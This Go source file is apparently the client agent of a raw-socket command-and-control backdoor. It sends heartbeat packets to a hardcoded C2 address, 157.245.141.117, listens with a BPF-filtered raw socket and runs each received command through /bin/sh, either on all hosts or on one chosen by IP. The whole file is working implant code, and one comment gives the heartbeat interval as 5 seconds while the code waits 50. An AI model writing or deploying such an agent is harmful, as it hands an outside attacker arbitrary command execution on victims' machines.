package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/DaveTheBearMan/Keydra/socket"
	"golang.org/x/sys/unix"
)

var lastCmdRan string

// Continuously send HELLO messages so that the C2 can respond with commands
func sendHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		fd := socket.NewSocket()
		defer unix.Close(fd)

		packet := socket.CreatePacket(iface, src, dst, 18000, 5542, dstMAC, socket.SendMessageClient(iface.HardwareAddr, src))

		addr := socket.CreateAddrStruct(iface)

		socket.SendPacket(fd, iface, addr, packet)
		fmt.Println("[+] Sent HELLO")
		// Send hello every 5 seconds
		time.Sleep(50 * time.Second)
	}
}

func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {

	// fmt.Println("[+] Payload Received")

	// Get command payload and trime newline
	data := string(packet.ApplicationLayer().Payload())
	data = strings.Trim(data, "\n")

	// Split into list to get command and args
	payload := strings.Split(data, " ")
	// fmt.Println("[+] PAYLOAD:", payload)

	// Check if target command
	if target {
		if payload[1] == hostIP.String() {
			// fmt.Println("[+] TARGET COMMAND RECEIVED")
			command := strings.Join(payload[2:], " ")
			execCommand(command)
		}
	} else {
		// Split the string to get the important parts
		// splitcommands := payload[1:]
		// Rejoin string to put into a single bash command string
		command := strings.Join(payload[1:], " ")
		execCommand(command)
	}
}

func execCommand(command string) {
	// Only run command if we didn't just run it
	if lastCmdRan != command {
		// fmt.Println("[+] COMMAND:", command)

		// Run the command and get output
		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			fmt.Println("\n[-] ERROR:", err)
		}
		// Save last command we just ran
		lastCmdRan = command
		// fmt.Println("[+] OUTPUT:", string(out))
	} else {
		// fmt.Println("[!] Already ran command", command)
	}

}

func main() {

	// Create BPF filter vm
	vm := socket.CreateBPFVM(socket.FilterRaw)

	// Create reading socket
	readfd := socket.NewSocket()
	defer unix.Close(readfd)

	// fmt.Println("[+] Socket created")

	// Get information that is needed for networking
	iface, src := socket.GetOutwardIface("157.245.141.117:80")
	// fmt.Println("[+] Using interface:", iface.Name)

	dstMAC, err := socket.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	// fmt.Println("[+] DST MAC:", dstMAC.String())
	// fmt.Println("[+] Starting HELLO timer")

	// Start hello timer
	// Set the below IP to the IP of the C2
	// 192.168.4.6
	go sendHeartbeat(iface, src, net.IPv4(157, 245, 141, 117), dstMAC)

	// Listen for responses
	// fmt.Println("[+] Listening")
	for {
		packet, target := socket.ClientReadPacket(readfd, vm)
		if packet != nil {
			go clientProcessPacket(packet, target, src)
		}
	}
}